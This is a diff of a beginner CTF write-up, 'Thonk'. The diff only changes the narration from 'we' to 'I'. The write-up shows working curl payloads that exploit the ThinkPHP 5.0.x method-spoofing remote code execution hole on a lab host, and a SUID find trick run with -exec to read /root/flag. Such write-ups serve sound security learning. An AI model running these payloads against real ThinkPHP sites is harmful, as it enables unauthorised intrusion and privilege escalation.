@@ -9,15 +9,15 @@
 ---
 
 ## 1. Executive Summary
-"Thonk" is a beginner-friendly CTF challenge featuring an instance running an outdated **ThinkPHP V5** framework. By leveraging a known Remote Code Execution (RCE) vulnerability via method spoofing and parameter manipulation, we achieve initial code execution as the `www-data` user. Following local enumeration, we identify a custom SUID binary that allows us to escalate our privileges and retrieve the flag from `/root/flag`.
+"Thonk" is a beginner-friendly CTF challenge featuring an instance running an outdated **ThinkPHP V5** framework. By leveraging a known Remote Code Execution (RCE) vulnerability via method spoofing and parameter manipulation, I achieve initial code execution as the `www-data` user. Following local enumeration, I identify a custom SUID binary that allows us to escalate our privileges and retrieve the flag from `/root/flag`.
 
 ---
 
 ## 2. Reconnaissance & Initial Access (RCE)
 
-Upon analyzing the target application, we identify that the web application runs on **ThinkPHP V5**. ThinkPHP versions 5.0.x are historically vulnerable to a well-documented RCE vulnerability stemming from improper handling of request methods and filters (`_method=__construct`).
+Upon analyzing the target application, I identify that the web application runs on **ThinkPHP V5**. ThinkPHP versions 5.0.x are historically vulnerable to a well-documented RCE vulnerability stemming from improper handling of request methods and filters (`_method=__construct`).
 
-We craft a malicious HTTP `POST` request targeting `index.php?s=captcha` to test command execution via the `system` filter:
+I craft a malicious HTTP `POST` request targeting `index.php?s=captcha` to test command execution via the `system` filter:
 
 
 > curl -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \
@@ -30,7 +30,7 @@ This confirms successful Remote Code Execution (RCE) under the low-privileged ww
 
 ## 3. Enumeration
 
-With code execution established, we inspect the current web root directory to understand the application structure and environment configuration:   
+With code execution established, I inspect the current web root directory to understand the application structure and environment configuration:   
 > curl -s -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \ -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls+-la"
 
 
@@ -69,7 +69,7 @@ Because it carries the SUID bit and belongs to a privileged context, executing i
 
 ## 5. Exploitation & Flag Retrieval
 
-We leverage the custom SUID binary /home/max/find to target the protected root flag located at /root/flag. By utilizing the -exec argument of the find utility, we can execute the cat command directly through the privileged binary:
+I leverage the custom SUID binary /home/max/find to target the protected root flag located at /root/flag. By utilizing the -exec argument of the find utility, I can execute the cat command directly through the privileged binary:
 
 > curl -s -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \ -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%2Fhome%2Fmax%2ffind+%2Froot%2fflag+-exec+cat+%7B%7D+%5c%3b"
 
